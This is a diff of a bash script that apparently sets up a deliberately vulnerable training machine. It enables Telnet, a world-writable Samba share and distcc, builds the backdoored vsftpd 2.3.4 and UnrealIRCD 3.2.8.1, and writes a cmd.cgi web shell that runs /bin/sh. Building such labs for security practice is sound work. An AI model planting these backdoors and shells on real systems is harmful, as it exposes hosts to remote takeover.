@@ -86,19 +86,22 @@ echo "[+] Detected Distro: $DISTRO"
 
 # Function to install via apt (Debian/Ubuntu)
 install_apt() {
+    echo "[+] Updating repositories..."
     sudo add-apt-repository universe -y
     sudo apt update -y && sudo apt upgrade -y
 
+    echo "[+] Installing core packages..."
     sudo apt install -y build-essential gcc make perl git curl wget unzip nmap net-tools \
-        openssh-server telnet vsftpd apache2 mysql-server samba smbclient \
-        libmysqlclient-dev python3-pip python3-smbus \
-        nikto wireshark tftpd-hpa tftp-hpa openbsd-inetd distcc
+        openssh-server vsftpd apache2 mysql-server samba smbclient \
+        libmysqlclient-dev python3-pip \
+        nikto wireshark tftpd-hpa openbsd-inetd distcc || true
 
-    # Optional packages
-    sudo apt install -y exploitdb || echo "[!] exploitdb not found; consider installing manually."
-    sudo pip3 install smbus --break-system-packages || echo "[!] Failed to install smbus via pip."
+    echo "[+] Installing optional legacy tools..."
+    sudo apt install -y exploitdb telnet tftp || echo "[*] Some optional packages may need manual install"
 
-    echo "[+] Package installation complete."
+    # Install Python dependencies with --break-system-packages
+    echo "[+] Installing Python modules..."
+    sudo pip3 install --break-system-packages smbus || echo "[!] Failed to install smbus"
 }
 
 # Function to install via dnf (Fedora)
@@ -172,7 +175,6 @@ case "$DISTRO" in
         sudo systemctl enable apache2 --now
         sudo systemctl enable mysql --now
         sudo systemctl enable smbd --now
-        sudo systemctl enable telnet --now
         ;;
     fedora|centos|rhel|rocky)
         sudo systemctl enable vsftpd --now
@@ -227,13 +229,16 @@ sudo mkdir -p /srv/samba
 sudo chmod -R 0777 /srv/samba
 sudo systemctl restart smb || echo "[!] Failed to restart Samba"
 
-# Enable Telnet
-echo "[+] Enabling Telnet..."
-if [ -f /etc/xinetd.d/telnet ]; then
-    sudo sed -i 's/disable = yes/disable = no/' /etc/xinetd.d/telnet
-    sudo systemctl restart xinetd
+# Enable Telnet if supported
+echo "[+] Setting up Telnet..."
+if [ "$DISTRO" == "ubuntu" ] || [ "$DISTRO" == "debian" ]; then
+    sudo apt install -y openbsd-inetd telnetd > /dev/null 2>&1 || true
+    sudo systemctl restart openbsd-inetd
+elif [ "$DISTRO" == "fedora" ] || [ "$DISTRO" == "centos" ] || [ "$DISTRO" == "rhel" ] || [ "$DISTRO" == "rocky" ]; then
+    sudo yum install -y xinetd telnet-server > /dev/null 2>&1 || true
+    sudo systemctl enable xinetd --now
 elif [ "$DISTRO" == "arch" ]; then
-    echo "[*] Telnet is not installed by default on Arch. You may need to install it manually."
+    echo "[*] Telnet not installed by default on Arch. Consider installing manually."
 fi
 
 # Compile and install vsftpd 2.3.4 backdoor
@@ -278,7 +283,7 @@ echo "<pre>"
 /bin/sh
 echo "</pre>' | sudo tee $DIR/cmd.cgi > /dev/null
 sudo chmod +x $DIR/cmd.cgi
-sudo chown www-www-data $DIR/cmd.cgi || true
+sudo chown www-data:www-data $DIR/cmd.cgi || true
 
 # Setup UnrealIRCD
 echo "[+] Installing UnrealIRCD 3.2.8.1..."
